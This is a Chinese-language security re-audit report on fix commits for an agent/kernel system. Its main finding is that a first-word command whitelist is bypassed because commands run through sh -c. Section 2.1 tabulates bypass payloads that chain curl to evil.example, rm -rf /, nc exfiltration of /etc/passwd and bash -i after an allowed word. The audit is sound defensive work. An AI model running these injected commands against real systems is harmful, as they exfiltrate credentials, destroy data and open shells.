# 攻击面管理修复 — 二次审计报告

**日期**: 2026-08-15 | **版本**: v0.2.3 | **性质**: 审计 + 归档（不修复）
**对象**: 攻击面管理专项审计（`ATTACK_SURFACE_MANAGEMENT_AUDIT_2026-08-15.md`）后的 6 个修复提交（93e8d71 / ce86496 / 5d30f02 / 4bcb2d7 / f3d277a）
**方法**: 代码级验证 + 绕过向量实测 + 残留扫描 + 回归

---

## 一、执行摘要

| 维度 | 结论 |
|------|------|
| 修复完整性 | ⚠️ **P0-2（user_check 白名单）修复不完整，存在系统性绕过** |
| 修复正确性 | ✅ CLI peer / mTLS 强制 / 白名单下发 验证通过 |
| 删除残留 | ⚠️ 2 处 P2 残留（Makefile tag、docker 配置节） |
| 回归 | ✅ 构建/测试全绿 |

---

## 二、P0 重大发现 — user_check 首词白名单被 shell 控制字符绕过

### 2.1 绕过向量实测（6/6 全部通过首词校验）

`isUserCheckCommandAllowed` 仅检查**命令首词**（第一个空格前的 token），但实际执行是 `sh -c <整串>`——首词之后可任意拼接：

| 绕过向量 | 首词 | 校验结果 | 实际执行 |
|---------|------|:---:|---------|
| `echo ok; curl http://evil.example` | echo | ✅ 通过 | **curl 执行（网络外联）** |
| `true && rm -rf /` | true | ✅ 通过 | **rm 执行** |
| `echo $(curl http://evil.example)` | echo | ✅ 通过 | **命令替换执行** |
| `echo \`rm -rf /\`` | echo | ✅ 通过 | **反引号执行** |
| `cat /etc/passwd \| nc 1.2.3.4 4444` | cat | ✅ 通过 | **管道 nc 外联** |
| `systemctl status \|\| bash -i` | systemctl | ✅ 通过 | **bash 执行** |

### 2.2 影响范围

- **本地 user_check**（agent.ini / config.ini 配置）与 **内核同步 user_check**（AgentCheckConfig → ParseUserChecks，共享同一校验）**均受影响**
- 白名单防护形同虚设：`;`/`&&`/`||`/`|`/`$()`/反引号 之后可执行任意命令
- 实际危害受配置来源保护限制（root 权限 + 内核同步，非 root 无法写入配置），但**宣称的"白名单收紧"不成立**，且合法配置中的管道用法（如 `ss -tlnp | grep :22`）本身就是绕过入口

### 2.3 根因

首词校验与 `sh -c` 整串执行之间的语义鸿沟：校验了第一个 token，执行的是整个 shell 脚本。

### 2.4 修复方向（建议，未实施）

1. **严格模式**：整个命令串检查 shell 元字符（`; & | $() \` ` 等），含则拒绝——破坏管道能力
2. **白名单整串匹配**（对齐 `allowedShellCommands` 模式）：管道/复杂命令需显式列入整串白名单；简单命令走"白名单首词 + 直接 exec（非 sh -c）"
3. **最彻底**：user_check 命令不用 `sh -c`，解析为"白名单命令 + 参数数组"直接 exec（同 common.RunCmd），管道能力通过显式安全命令（如 grep 的 -f）替代
4. 推荐 **2+3 组合**：无元字符 → 直接 exec；含元字符 → 整串白名单显式匹配

---

## 三、验证通过项（修复正确性确认）

### 3.1 Web UI 删除（93e8d71）✅

- Go 代码/构建脚本/CI/Dockerfile/docker-compose/systemd unit 零 webui/8087 残留
- healthcheck 已从 wget :8087 改为 pgrep（Dockerfile + compose 双处一致）
- 回归全绿

### 3.2 CLI socket（5d30f02）✅

- 0600 权限 + Linux SO_PEERCRED 校验（`verifyPeerCLI`）在连接处理路径（accept 后、session 前）
- root 与内核自身 UID 允许，其余拒绝并记录
- 非 Linux stub 降级为文件权限

### 3.3 mTLS 强制（4bcb2d7）✅

- `config.RequireMTLS` 默认 true；`--no-mtls` + require_mtls → exit(1)
- agent 侧无需对称强制：kernel 拒绝明文连接，agent 不启用 TLS 即无法注册

### 3.4 白名单下发（f3d277a）✅

- common 白名单 RWMutex 化 + AddAllowedCommands 幂等
- 版本指纹含命令（命令变化触发重同步）
- 内置基线不可删

---

## 四、P2 残留发现（删除不完整）

| # | 位置 | 问题 | 影响 |
|:--:|------|------|:---:|
| R1 | `deploy/Makefile` MODULE_TAGS | 仍含 `webui` tag | 构建不失败（tag 未引用已删包），但残留误导 |
| R2 | `deploy/docker/config.docker.ini` | `[webui] port=8087` 节残留 | kernel 已不收集 webui 节，无害但残留 |

---

## 五、回归验证

```
✅ go build ./cmd/kernel/（最小 + 全 tag）: exit 0
✅ go test ./internal/...（无 tag）: 无 FAIL
✅ 全 tag 核心包（common/agent/comms/config）: 全绿
```

---

## 六、结论

| 项 | 状态 |
|----|------|
| P0-1 Web UI 删除 | ✅ 完整 |
| P0-2 user_check 白名单 | ❌ **不完整——首词校验被 shell 控制字符系统性绕过（P0）** |
| P1 CLI socket | ✅ 完整 |
| P1 mTLS 强制 | ✅ 完整 |
| P2 白名单下发 | ✅ 完整 |
| 删除残留 | ⚠️ 2 处 P2（Makefile tag / docker 配置节） |

**核心结论**：攻击面收敛的 5 项中 4 项验证完整；**P0-2 的"白名单修复"实际未达到宣称的安全效果**——首词校验与 `sh -c` 整串执行之间存在可利用的语义鸿沟，需要按 §2.4 方向重新设计（建议整串白名单或直接 exec 替代 sh -c）。

*审计完成于 2026-08-15。仅审计归档，不修复。*
